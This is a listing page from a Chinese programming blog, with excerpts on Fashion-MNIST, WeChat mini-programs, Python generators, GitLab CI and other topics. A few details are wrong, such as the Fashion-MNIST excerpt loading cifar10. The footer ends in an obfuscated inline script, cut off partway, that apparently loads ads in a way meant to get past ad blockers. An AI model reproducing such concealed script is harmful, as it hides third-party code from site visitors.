了解Fashion-MNIST数据集 Fashion-MNIST数据集与MNIST手写数字数据集不一样。但他们都有共同点就是都是灰度图片。
Fashion-MNIST数据集是各类的服装图片总共10类。下面列出了中英文对应表，方便接下来的学习。
中文英文t-shirtT恤trouser牛仔裤pullover套衫dress裙子coat外套sandal凉鞋shirt衬衫sneaker运动鞋bag包ankle boot短靴 下载数据集 使用tensorflow下载（推荐） 默认下载在C:\Users\用户\.keras\datasets路径下。
from tensorflow.keras import datasets # 下载数据集 (train_images, train_labels), (test_images, test_labels) = datasets.cifar10.load_data() 数据集分类 这里对从网上下载的数据集进行一个说明。
文件名数据说明train-images-idx3-ubyte训练数据图片集train-labels-idx1-ubyte训练数据标签集t10k-images-idx3-ubyte测试数据图片集t10k-labels-idx1-ubyte测试数据标签集 数据集格式 训练数据集共60k张图片，各个服装类型的数据量一致也就是说每种6k。
测试数据集共10k张图片，各个服装类型的数据量一致也就是说每种100。
数据集均采用28281的灰度照片。
采用CPU训练还是GPU训练 一般来说有好的显卡(GPU)就使用GPU训练因为快，那么对应的你就要下载tensorflow-gpu包。如果你的显卡较差或者没有足够资金入手一款好的显卡就可以使用CUP训练。
区别 （1）CPU主要用于串行运算；而GPU则是大规模并行运算。由于深度学习中样本量巨大，参数量也很大，所以GPU的作用就是加速网络运算。
（2）CPU计算神经网络也是可以的，算出来的神经网络放到实际应用中效果也很好，只不过速度会很慢罢了。而目前GPU运算主要集中在矩阵乘法和卷积上，其他的逻辑运算速度并没有CPU快。
使用CPU训练 # 使用cpu训练 import os os.environ["CUDA_VISIBLE_DEVICES"] = "-1" 使用CPU训练时不会显示CPU型号。
使用GPU训练 gpus = tf.config.list_physical_devices("GPU") if gpus: gpu0 = gpus[0] # 如果有多个GPU，仅使用第0个GPU tf.config.experimental.set_memory_growth(gpu0, True) # 设置GPU显存用量按需使用 tf.config.set_visible_devices([gpu0], "GPU") 使用GPU训练时会显示对应的GPU型号。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/045b77c5871102d5563744f3496f2010/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00cbe43287c6d7edcbdc9021ef4c5e41/" rel="bookmark">
			创建一个微信小程序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注册微信小程序 文档：微信小程序开发官方文档：
进入微信公众平台，没有注册的话，点击“立即注册”，选择小程序，进入填写页面填写信息，注册成功后，可以在设置找的自己的AppId
微信开发者工具 下载微信开发者工具
开发小程序 打开微信开发者工具，微信登录后，选择小程序，点击“+”按钮，新建一个小程序，项目名称和项目目录可以自己定义，输入AppId。可以生成一个基本的项目
目录结构 app.json 是当前小程序的全局配置，包括了小程序的所有页面路径，界面表现，网络超时时间，底部tab，
pages下的json文件：让开发者可以独立定义每个页面的一些属性，例如刚刚说的顶部颜色、是否允许下拉刷新等等
wxml文件：类似与html文件，编写页面的标签
wxss文件：类似于css文件，编写页面的样式
js文件：编写页面的逻辑
示例小程序项目：
分为三个页面，可以在底部进行页面跳转
// app.json { "pages": [ "pages/index/index", "pages/logs/logs", "pages/me/me", "pages/vant/vant" ], "window": { "backgroundTextStyle": "light", "navigationBarBackgroundColor": "#2f2f8f", "navigationBarTitleText": "Weixin", "navigationBarTextStyle": "white", "pageOrientation": "auto" }, "tabBar": { "color": "#bfc1ab", "selectedColor": "#13b11c", "backgroundColor": "#1f1f4f", "list": [ { "pagePath": "pages/index/index", "iconPath": "image/icon_component.png", "selectedIconPath": "image/icon_component_HL.png", "text": "个人中心" }, { "pagePath": "pages/me/me", "iconPath": "image/icon_component.png", "selectedIconPath": "image/icon_component_HL.png", "text": "首页" }, { "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/00cbe43287c6d7edcbdc9021ef4c5e41/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b04d996a4d341961445b367d3f9052be/" rel="bookmark">
			迭代器生成器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、迭代器、生成器 迭代器 迭代器：一个可迭代对象，不放回 迭代器定义 是一个容器型数据，支持遍历和转列表一种特殊专门为了遍历而建立的数据类型 迭代器特性： 打印一个迭代器，看不到元素(print)迭代器无法获取元素个数(len)如果想要使用迭代中的元素，必须将元素从迭代器中取出（遍历）而且在取的时候，只能自上而下取数，且取一个少一个，取出来的数据无法再放回（无放回） 迭代器的功能：利用其不放回的特性，进行实际生活中的应用迭代器操作 创建迭代器： 用iter(）直接转创立生成器 迭代器的查： 获取单个元素(获取最上层元素)：next（迭代器）
li = ‘abc’print(next(li)) -&gt; ‘a’print(next(li)) -&gt; ‘b’ 遍历:for循环
转化成列表：list（），用完list构造器后，原迭代器也会被取完
生成器 生成器：一个生成指定个数，指定数值的算法，yield
生成器定义： 是容器型数据类型，不是存储数据，而是储存能够自动生成数据的算法，来节省空间。特性和取数操作和迭代器一样，只有底层的数据储存原理不一样和创建方法不一样 生成器特性： 打印无法看到元素（print）无法看到元素的个数（len）用的时候要使用生成器的数据，遍历（for）取一个少一个（无放回） 生成器的功能：1.节省内存。2.利用yield特性，进行处理迭代器操作： 创建生成器：不是数据本身，而是创建产生数据的算法（自定义函数） 函数中加入yield的特殊性： 单行写入yield就行，只要有yield就会变成生成器此时调用函数，不会返回return值，会返回一个生成器对象 写法： 数据个数：生成器创建数据的个数和数据的值，由执行函数体时，遇到几次yield，就会生成多少个数据数据的值：yield后面的值是什么，元素的值就是什么。相当于return。 常见用法： def func（subject）：for i in range(1,100): yield f'{subject}{x:0&gt;3}' gen = func(‘Python’)for i in gen: print(i) 输出值是：’python001‘到’python099‘ 生成器的查：和迭代器一样 生成器产生数据的原理 yield：只有在遍历时会执行函数；会分隔函数；且标记，下次从上次的位置开始运行 调用函数，进行传参的时候，不执行函数体。只有当在获取该生成器对象中元素的时候，才会调用函数体。每次执行函数体：从开始执行到一个yield停下，将yield后面的数据作为获取到的元素。下次执行：接着上次的地方接着执行。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e8ba2f79bcef64a0b0d4545a0b2b7fc8/" rel="bookmark">
			【GitLab CI/CD】：条件、分支（rules）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1. 用途 2. 机制 2.1. Rules attributes 2.2. Rules clauses 2.3. rules:if 2.3.1. Common if clauses for rules 2.4. rules:changes 2.5. rules:exists 3. 综合示例 3.1. 示例1：根据 commit meesage 触发 3.2. 示例2：根据 Tag 触发 1. 用途？
.gitlab-ci.yml 的 rules 配置，能让我们根据自定义的筛选条件，控制 job 是否执行：
这段脚本我只想在 dev 分支执行，另一段只想在 master 分支执行；
这段脚本我只想在 master 分支上打 tag 的时候触发，其他情况不触发；
这段脚本我只想在 这些文件产生变更时触发，其他情况不触发；
这段脚本我只想在 commit message 中包含某些特定关键字时才触发；
....
一个例子：
job: script: echo "Hello, Rules!" rules: - if: '$CI_PIPELINE_SOURCE == "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e8ba2f79bcef64a0b0d4545a0b2b7fc8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afd0bed4806d2f2760739ca0308f9d47/" rel="bookmark">
			力扣---找到两个链表的交点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：给你两个单链表的头节点headA和headB，请你找出并返回两个单链表相交的起始节点，如果两个链表不存在相交节点，返回null。
解题思路：
1、首先我们求出两个链表的表长和长度差n
2、我们再找到较长链表的第n个节点
3、从较长链表第n个节点和较短链表的第一个节点等速遍及
4、如果存在相交节点则找到，如果遍历到最后一个节点都没有找到则没有相交节点。
代码实现
getSameNode(ListNode headA, ListNode headB){
pA = headA;
pB = headB;
int lA = len(pA);
int lB = len(pB);
n = (lA &gt; lB) ? lA - lB : lB - lA;
if(lA &gt; lB){
while(n&gt;0){
pA = pA.next;
n--;
}
}else{
while(n&gt;0){
pB = pB.next;
n--;
}
}
while(pA != null &amp;&amp; pB != null){
if(pA == pB) return pA;
pA = pA.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/afd0bed4806d2f2760739ca0308f9d47/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f80d3a0e3752f10f27023541a2f64559/" rel="bookmark">
			Ubuntu18.04安装gtsam，以及注意事项
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		gtsam (Georgia Tech Smoothing and Mapping library, 4.0.0-alpha2) wget -O ~/Downloads/gtsam.zip https://github.com/borglab/gtsam/archive/4.0.0-alpha2.zip cd ~/Downloads/ &amp;&amp; unzip gtsam.zip -d ~/Downloads/ cd ~/Downloads/gtsam-4.0.0-alpha2/ mkdir build &amp;&amp; cd build cmake .. sudo make install 但是编译之前需要把系统关闭，防止冲突，后续实验无法安装好
cmake -DGTSAM_BUILD_WITH_MARCH_NAITVE=OFF -DGTSAM_USE_SYSTEM_EIGEN=ON .. 执行这部分之后，再执行sudo make install
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f062077d578ea5174b1f18b75f12d8a1/" rel="bookmark">
			element table树形结构的展开箭头如何移到第二列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		el-table-column 设置 type=""，就可将箭头后移
&lt;el-table-column prop="date" label="日期" sortable width="180" type=""&gt; &lt;/el-table-column&gt; 同理可推，如果想要往后移几列，前面的都加上type=“”就好了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f4fe857b6dbe7418b97976e50fdffa0/" rel="bookmark">
			games101学习笔记_Shading2(着色)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		games101_Shading Shading 1回顾镜面反射(Specular Term)冯氏模型Blinn-Phong光照模型 环境光(Ambient Term)Blinn-Phong光照模型例子 着色频率(Shading Frequencies)Flat Shading（左球）Gouraud Shading(中图)Phong shading（右球）着色频率的比较：面着色、点着色和像素着色 定义逐顶点的法线(Defining Per-Vertex Normal Vectors)定义逐像素的法线(Defining Per-Pixel Normal Vectors) 图形（实时）渲染管线[Graphics(Real-time) Rendering Pipeline]Shader Programs 纹理映射(Texture mapping) Shading 1回顾 Blinn - Phong 光照模型(Blinn - Phong reflectance model)包括 ：
漫反射镜面反射环境光
上一节讲了漫反射，下面讲一下镜面反射和环境光。
镜面反射(Specular Term) 冯氏模型 高光: 当物体的表面很光滑的时候，在一定的角度范围(观察者角度z与出射角度R接近)内观察这个平滑的表面表面时，能够看到一个高光的效果。
如在用光源照射金属时，在一定的角度内可以看到一个有一定大小的光点，但你偏离一定的角度之后，就不能再看到这个高光效果。
在漫反射的部分已经讲过，漫反射的着色与观察方向无关，而漫反射不同，镜面反射的效果是与观察方向有关的。
当观察方向和光的反射方向越近的时候，观察到的镜面反射效果越强。
如何衡量两个上图中反射光和观察方向是否足够近？可以用反射光的方向向量和观察方向的方向向量做点乘，得到其夹角的余弦值，点乘的结果越大，则反射光和观察方向就越近。
Blinn-Phong光照模型 上面这是冯氏光照模型的做法，Blinn - Phong光照模型是对冯氏模型的一个改进，下面是Blinn - Phong的做法：
当我们观察的方向与镜面反射向量相近的时候其实就说明了法线向量和半程向量(即入射角和出射角的中间向量)接近。
并且我们这里并不是计算反射光和观察方向的远近，而是计算半程向量h和该平面的法向量n的远近。因为反射光和观察方向越近，半程向量和法向量也就越近，但是计算反射光的计算量比较大，而半程向量h只需要将v和l相加，再标准化即可得到。
最终计算某一点的高光强度的计算方法如下：
ks：镜面反射系数，不同的材质对光的反射程度不同，如金属和木头对光的反射效果就不同。(I/r²)：光到达着色点的能量。这里的向量n和向量h的点乘是为了判断两个向量的接近程度，如果越接近他们点乘的结果就越接近1。反射方向和高光观察方向越接近，半程向量和法向量就越接近，反之亦然。指数p：如果这里没有指数p，虽然我们也能直接使用点乘的值，但这个值过大，从而计算生成的高光面积也会变得很大，为了避免面积过大，我们采用了指数降低它的值。
所以可以用较高的指数p将高光限制在一个很小的范围内。
环境光(Ambient Term) 在上一节说到，环境光就是许多光线经过多次漫反射最终打在某一点上，因为环境光的太复杂，所以直接将环境光设置为一个常数，假设任何一点接受到的都是一个相同的环境光(事实上并不是这样的，这需要运用全局光照)。
环境光不用考虑光的方向，与观察的方向也无关。
Ia：环境光，在我们的假设里是一个常数，保证没有任何一个地方完全是黑的。事实上要计算环境光要考虑到全局光照，这里暂时不考虑，看作一个常数。ka：环境光系数。 Blinn-Phong光照模型例子 三种光照加在一起就能得到最后的Blinn-Phong光照模型。
L：布林冯反射项La：环境光项Ld：漫反射项Ls：高光项 目前为止是考虑一个着色点上的情况，所以接下来我们会对所有的着色点做一遍以上的处理。
着色频率(Shading Frequencies) 是什么东西引起了下面三个材质球表面着色的不同？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f4fe857b6dbe7418b97976e50fdffa0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7cb1efeffc5765e9c1bc90f458cf068/" rel="bookmark">
			Spring boot实操演练3 ——导出表格数据为Excel文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、业务场景
2、开发环境和工具
3、代码思路
4、参考代码
controller层
service层
1、业务场景 （1）、前置条件：查询接口已经做好，可直接调用；
（2）、需要实现：
前端：点击查询结果数据列表右上方的导出按钮后，导出一个对应数据列表的excel文件，文件名由前端定义；
后端：接收到导出请求后，首先进行身份验证（这里以companyId为例），然后执行创建excel文件的一系列操作，sheet（工作薄）名称和表头都需要按照需求定义设计；
2、开发环境和工具 因为该业务功能是在我实习公司已有项目下的拓展，所以环境依赖较多，我将重点阐述我所负责的后端代码逻辑，开发环境和工具只会简单带过；
（1）、IDE：IntelliJ IDEA 2022.1
（2）、测试：Postman
（3）、JDK：jdk-11.0.15
（4）、Spring Boot Version：2.2.5.RELEASE
（5）、modelVersion：4.0.0
（6）、pomVersion：0.0.1-SNAPSHOT
3、代码思路 4、参考代码 实体类（代码中体现为：EntityClassVo+数字）请根据实际的业务需求自行构建，我的理解就是把数据库对应属性放进去，然后添加属性方法（get和set）即可。
controller层 /** * 导出设备信息数据列表 * @param vo * @param request * @param response * @return: xxx.utils.util.CommonResponse * @author Mike-GY * @since: 2022/8/2 */ @RequestMapping(value ="/exportDeviceInfoList" ,method = RequestMethod.POST) public void exportDeviceInfoList(@RequestBody EntityClass1Vo vo, HttpServletRequest request, HttpServletResponse response) throws IOException{ //通过前端获取公司ID，即保证只能查询和导出自己公司的数据 int companyId = Integer.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e7cb1efeffc5765e9c1bc90f458cf068/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08a0e5ccbf4c810f8a283f5cf07f17bb/" rel="bookmark">
			计算机组成原理——存储系统の选择题整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		存储器概述 1、存储器存取周期是指（）
A、存储器的读出时间
B、存储器的写入时间
C、存储器进行连续读或写操作所允许的最短时间间隔
D、存储器进行一次读或写操作所需的平均时间
解析：选C
存取周期是存储器进行连续读或写操作所允许的最短时间间隔
存取时间是存储器进行一次读或写操作所需的平均时间
2、设机器字长为32位，一个容量为16MB的存储器，CPU按半字寻址，其可寻址的单元数是（）
A、224
B、223
C、222
D、221
解析：选B
32位是4B，因为CPU按半字寻址，因此每个寻址单元的长度是4/2=2B，16MB=24 * 220=224B。因此寻址单元数是224/2=223
3、设机器字长为64位，存储容量为128MB，若按字编址，它可寻址的单元个数是（）
A、16MB
B、16M
C、32M
D、32MB
解析：选B
因为按字寻址，所以64位 =&gt; 8B，128MB/8B=16M
4、在多级存储体系中，“Cache-主存”结构的作用是解决（）问题
A、主存容量不足
B、主存与辅存速度不匹配
C、辅存与CPU速度不匹配
D、主存与CPU速度不匹配
解析：选D
“Cache-主存”结构，拥有Cache的速度和主存的容量，而Cache只能与主存和CPU进行相应的存取操作，不能直接与辅存进行操作，因此“Cache-主存”结构与辅存无关，利用该结构可以将主存的速度提高，因此是解决主存与CPU速度不匹配的问题。
5、下列关于多级存储系统说法中正确的是（）
a.多级存储系统是为了降低存储成本
b.虚拟存储器中主存和辅存之间的数据调动对任何程序员是透明的
c.CPU只能与Cache直接交换信息，CPU与主存交换信息也需要经过Cache
A、仅a
B、仅a和b
C、a、b和c
D、仅b
解析：选A
多级存储系统是将一些常用的数据放在离CPU近的地方，不常用的放在外存/辅存中，这样既可以保证计算机的运行效率，又可以使得尽可能便宜的扩大存储容量，降低了存储成本。
虚拟存储器中主存和辅存之间的数据调动是通过操作系统的相关指令来实现的，只对应用程序员透明。其他的程序员需要操控数据调用，因此不能透明。
CPU可以和Cache以及内存直接进行交换信息。
主存储器 1、某一SRAM芯片，其容量为1024*8位，除电源和接地端外，该芯片的引脚的最小数目为（）
A、21
B、22
C、23
D、24
解析：选A
容量为1024*8位，因此数据线为8根，地址线为10根（1024=210），除了电源和接地线，还需要片选线（1根），读写数据线（可以合用1根，可以读写分开用2根）。因此最小数目为10+8+1+1=20根，但题目中没有20的选项，因此采用读写数据线分开，即10+8+1+2=21根。
2、某存储器容量为32K*16位，则（）
A、地址线为16根，数据线为32根
B、地址线为32根，数据线为16根
C、地址线为15根，数据线为16根
D、地址线为15根，数据线为32根
解析：选C
32K =&gt;25 * 210=215，所以地址线为15根
16位，所以数据线为16根
3、下列（）是动态半导体存储器的特点
a.在工作中存储器内容会发生改变
b.每隔一段时间，需要根据原存内容重新写入一遍
c.一次完整的刷新过程需要占用两个存储周期
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/08a0e5ccbf4c810f8a283f5cf07f17bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d52314c1a1dabf48dc924bb99ad13656/" rel="bookmark">
			深度学习100例 —— 卷积神经网络(CNN)实现服装图像分类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		活动地址：CSDN21天学习挑战赛
深度学习100例——卷积神经网络(CNN)服装图像分类 文章目录 深度学习100例——卷积神经网络(CNN)服装图像分类1. 前期准备工作1.1 设置GPU1.2 导入数据1.3 数据归一化1.4 调整图片格式1.5 可视化查看数据图像 2. 构建CNN网络2.1 构建网络2.2 模型说明 3. 编译模型4.训练模型5. 模型预测6. 模型评估 1. 前期准备工作 我的环境：
1.1 设置GPU import tensorflow as tf gpus = tf.config.list_physical_devices("GPU") # tf.config.list_physical_devices# 获得当前主机上某种特定运算设备类型（如 GPU 或 CPU ）的列表 if gpus: gpu0 = gpus[0] #如果有多个GPU，仅使用第0个GPU tf.config.experimental.set_memory_growth(gpu0, True) #设置GPU显存用量按需使用 tf.config.set_visible_devices([gpu0],"GPU") # 设置可见设备列表 当前机器只有一个GPU
1.2 导入数据 import tensorflow as tf from tensorflow.keras import datasets, layers, models import matplotlib.pyplot as plt (train_images, train_labels), (test_images, test_labels) = datasets.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d52314c1a1dabf48dc924bb99ad13656/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce35eed94d9eb09ae09effebc9585b51/" rel="bookmark">
			springboot2.x中的java mail使用相关模板，发送带静态资源与附件邮件到163邮箱
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.163邮箱配置 省略部分其他getter与setter方法
2.发送邮件的interface 3.发送邮件的接口实现类 import com.springcloud.my.config.MailFor163Config; import com.springcloud.my.service.MailSendTo163Service; import com.springcloud.my.utils.ContentTypeEnum; import com.springcloud.my.utils.SetVelocityPro; import lombok.extern.slf4j.Slf4j; import org.apache.velocity.Template; import org.apache.velocity.VelocityContext; import org.apache.velocity.app.VelocityEngine; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.core.io.FileSystemResource; import org.springframework.mail.javamail.JavaMailSenderImpl; import org.springframework.mail.javamail.MimeMessageHelper; import org.springframework.stereotype.Service; import org.springframework.util.ResourceUtils; import javax.activation.DataHandler; import javax.activation.DataSource; import javax.activation.FileDataSource; import javax.mail.*; import javax.mail.internet.*; import java.io.File; import java.io.FileNotFoundException; import java.io.StringWriter; import java.io.UnsupportedEncodingException; import java.util.Date; import java.util.Map; import java.util.Properties; /** * 发送邮件到163邮箱服务 * * @Author Administrator * @Date 2020/6/26 */ @Slf4j @Service public class MailSendTo163ServiceImpl implements MailSendTo163Service { @Autowired JavaMailSenderImpl javaMailSender; @Autowired MailFor163Config mailFor163Config; private DataHandler getDataHandlerByPath(String resourceLocation) throws FileNotFoundException { File file = ResourceUtils.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ce35eed94d9eb09ae09effebc9585b51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8bf6e886013f739c061f7ec87ae7d5bc/" rel="bookmark">
			vue3&#43;ts&#43;vite2&#43;element-plus国际化(需要改进)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.安装element-plus，pinia，vue-i18n，js-cookie npm install element-plus --save-dev
npm install pinia --save-dev
npm install vue-i18n --save-dev
npm install js-cookie --save-dev
2.在store中创建language.ts等 此处的enLocal与zhLocal为对应的国际化ts文件，请自己定义
import Cookies from 'js-cookie'; import { createI18n } from 'vue-i18n'; import elementEnLocale from 'element-plus/lib/locale/lang/en'; import elementZhLocale from 'element-plus/lib/locale/lang/zh-cn'; import enLocale from './lang/en'; import zhLocale from './lang/zh-cn'; const langKey = 'i18nLang-key'; const messages = { 'en': { ...enLocale, ...elementEnLocale, }, 'zh': { ...zhLocale, ...elementZhLocale, } }; export const getCurrentLanguage = () =&gt; { return Cookies.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8bf6e886013f739c061f7ec87ae7d5bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3de520a30e90b31fbcac137e4a24fbfb/" rel="bookmark">
			SPWM波调制度原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PWM占空比 先看PWM波是怎样通过调节占空比实现对输出幅度调控的，如图所示，PWM波占空比为
D = T p T D=\frac{T_p}{T} D=TTp​​
PWM波经过低通滤波后，高频分量被滤除，仅保留了直流分量，根据信号系统知识，直流分量为
a 0 = 1 T ∫ T s ( t ) d t a_0=\frac{1}{T}\int_{T}s(t)dt a0​=T1​∫T​s(t)dt
如果我们对上式进行适当变形：
a 0 T = ∫ T s ( t ) d t a_0T=\int_{T}s(t)dt a0​T=∫T​s(t)dt
此即所谓的“面积等效原理”，对于PWM波而言，可知直流分量大小即信号幅度与占空比的乘积：
a 0 = A × D a_0=A\times D a0​=A×D
因此通过调整PWM波的占空比即可获得所需幅度的直流输出。
PWM波通常通过三角波比较产生：对于[0,1]间的三角波，与大小为D的信号相比较，产生的信号即为占空比为D的PWM波（根据三角形相似很容易得到），如下图所示， T p / T = D T_p/T=D Tp​/T=D
SPWM调制 对于SPWM波，由于载波频率远高于调制波频率，因此在短暂的一段时间内，可以视作被比较信号大小不变，如下图，根据前文所述，在这一短暂的时间内，其滤波输出信号的幅度将近似为 a 0 = A × D a_0=A\times D a0​=A×D
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3de520a30e90b31fbcac137e4a24fbfb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8610bf9eed80f326c5482d47a4262f61/" rel="bookmark">
			flex布局两端对齐最后一排处理方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="box"&gt; &lt;div class="item"&gt;&lt;/div&gt; &lt;div class="item"&gt;&lt;/div&gt; &lt;div class="item"&gt;&lt;/div&gt; &lt;div class="item"&gt;&lt;/div&gt; &lt;div class="item"&gt;&lt;/div&gt; &lt;div class="item"&gt;&lt;/div&gt; &lt;div class="item"&gt;&lt;/div&gt; &lt;div class="item"&gt;&lt;/div&gt; &lt;div class="item"&gt;&lt;/div&gt; &lt;div class="item"&gt;&lt;/div&gt; &lt;!-- 只需要在后面加一排的空盒子 空盒子高度0 宽度等于实际盒子的宽度就可以了 --&gt; &lt;div class="kong"&gt;&lt;/div&gt; &lt;div class="kong"&gt;&lt;/div&gt; &lt;div class="kong"&gt;&lt;/div&gt; &lt;div class="kong"&gt;&lt;/div&gt; &lt;div class="kong"&gt;&lt;/div&gt; &lt;/div&gt; &lt;style&gt; .box { display: flex; flex-wrap: wrap; justify-content: space-between; } .item { width: 20%; height: 100px; border: 1px solid #333; margin-bottom: 10px; } .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8610bf9eed80f326c5482d47a4262f61/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6b672fe89d069ecaeed85c4d4522eeb/" rel="bookmark">
			matlab中的exist()函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		matlab中的变量是可以不用被定义的，所以需要使用exist()函数来检测变量是否存在。
而C语言则不需要，我们都是提前将变量定义好，所以在翻译matlab中，这一块是不用被翻译的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42701773d4f3d114d3b998eb106196ac/" rel="bookmark">
			私人项目启动篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 私人项目启动篇 硬件方面： 一台PC，16线程32G。24小时运行，虚拟化服务器主力。
二手安卓机一只。24小时运行，内网穿透，nginx转发。
笔记本，PAD。远程终端，写代码用。
基础设施灾备： 双硬盘部署双节点，规划2个节点，双机热备。
UPS应急电源。
夜间增量拷贝：第三第四机械硬盘作为拷贝盘。
云盘备份数据库。
软件选型： 系统：debian-11docker 优先。数据库: mysql 主主模式。虚拟IP: keepalived 备备，不抢占模式。监控告警：zabbix HA高可用模式。内网穿透：nat123, holer免费域名：nat123配置 中心：Apollo后端：springboot前端：VUE 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/245/">«</a>
	<span class="pagination__item pagination__item--current">246/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/247/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function 